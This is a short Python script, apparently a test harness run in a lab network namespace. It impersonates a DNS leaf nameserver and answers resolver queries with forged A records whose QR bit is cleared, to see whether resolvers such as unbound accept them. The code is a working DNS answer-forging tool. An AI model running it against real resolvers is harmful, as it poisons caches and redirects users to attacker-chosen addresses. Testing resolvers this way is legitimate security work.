#!/usr/bin/env python3
"""Malicious leaf responder: answers upstream A queries with a QR=0
(query-shaped) datagram that nonetheless carries a forged A record and the
correct txid + question. Binds 10.53.0.12:53 (the real leaf-NS address that
veri-dns/unbound reach via referral), so datagramMatches (source==queried)
passes; only the QR bit distinguishes it from a legitimate response.

Usage: run inside the 'auth' namespace after stopping nsd-leaf.
    ip netns exec auth python3 qr0responder.py <answer-ip> [--opcode N] [--qr N]
"""
import socket, struct, sys, argparse

def qname_end(pkt, off):
    while True:
        l = pkt[off]
        if l == 0:
            return off + 1
        off += 1 + l

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("answer_ip")
    ap.add_argument("--qr", type=int, default=0, help="QR bit to set (default 0)")
    ap.add_argument("--opcode", type=int, default=0, help="opcode (default 0=query)")
    ap.add_argument("--bind", default="10.53.0.12")
    a = ap.parse_args()

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((a.bind, 53))
    sys.stderr.write(f"qr0responder bound {a.bind}:53 qr={a.qr} opcode={a.opcode} answer={a.answer_ip}\n")
    sys.stderr.flush()

    while True:
        req, addr = s.recvfrom(4096)
        if len(req) < 12:
            continue
        txid = req[0:2]
        qend = qname_end(req, 12)
        qsection = req[12:qend + 4]          # qname + qtype(2) + qclass(2)
        qtype = struct.unpack(">H", req[qend:qend + 2])[0]

        flags = ((a.qr & 1) << 15) | ((a.opcode & 0xF) << 11)
        # ancount=1 only for A queries; otherwise just echo qr-flag with no answer
        header = txid + struct.pack(">HHHHH", flags, 1, 1, 0, 0)
        answer = (struct.pack(">H", 0xC00C)
                  + struct.pack(">HHIH", 1, 1, 300, 4)
                  + socket.inet_aton(a.answer_ip))
        resp = header + qsection + answer
        s.sendto(resp, addr)
        sys.stderr.write(f"replied to {addr} txid={txid.hex()} qtype={qtype} qr={a.qr} -> {a.answer_ip}\n")
        sys.stderr.flush()

if __name__ == "__main__":
    main()
